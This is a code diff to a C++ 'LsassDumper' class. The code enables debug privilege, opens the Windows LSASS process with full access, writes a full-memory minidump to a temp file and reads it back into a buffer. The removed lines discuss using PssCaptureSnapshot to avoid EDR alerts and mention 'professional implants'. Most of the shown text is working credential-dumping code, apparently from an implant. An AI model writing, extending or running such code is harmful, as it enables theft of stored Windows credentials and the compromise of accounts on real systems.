@@ -1,6 +1,5 @@
 #include "LsassDumper.h"
 #include <tlhelp32.h>
-#include <processsnapshot.h>
 #include <dbghelp.h>
 #include <iostream>
 #include <vector>
@@ -53,19 +52,6 @@ DWORD LsassDumper::GetLsassPid() {
     return 0;
 }
 
-// Function pointer for PssCaptureSnapshot (available in Win 8.1+)
-typedef DWORD (WINAPI* _PssCaptureSnapshot)(
-    HANDLE ProcessHandle,
-    PSS_CAPTURE_FLAGS CaptureFlags,
-    DWORD Context,
-    HPSS* SnapshotHandle
-);
-
-typedef DWORD (WINAPI* _PssFreeSnapshot)(
-    HANDLE ProcessHandle,
-    HPSS SnapshotHandle
-);
-
 std::vector<BYTE> LsassDumper::Dump() {
     if (!EnableDebugPrivilege()) return {};
 
@@ -75,10 +61,6 @@ std::vector<BYTE> LsassDumper::Dump() {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return {};
 
-    // For simplicity and compatibility, we use MiniDumpWriteDump.
-    // In a real red-team scenario, we would use PssCaptureSnapshot (Win 8.1+)
-    // to avoid EDR alerts on MiniDumpWriteDump(hProcess, ...).
-    
     char tempPath[MAX_PATH], tempFile[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
     GetTempFileNameA(tempPath, "ben", 0, tempFile);
@@ -89,7 +71,6 @@ std::vector<BYTE> LsassDumper::Dump() {
         return {};
     }
 
-    // This is the "noisy" part. Professional implants often use a custom dumper.
     BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
     
     CloseHandle(hFile);
@@ -102,6 +83,8 @@ std::vector<BYTE> LsassDumper::Dump() {
 
     // Read file into memory
     hFile = CreateFileA(tempFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return {};
+
     DWORD size = GetFileSize(hFile, NULL);
     std::vector<BYTE> buffer(size);
     DWORD read;
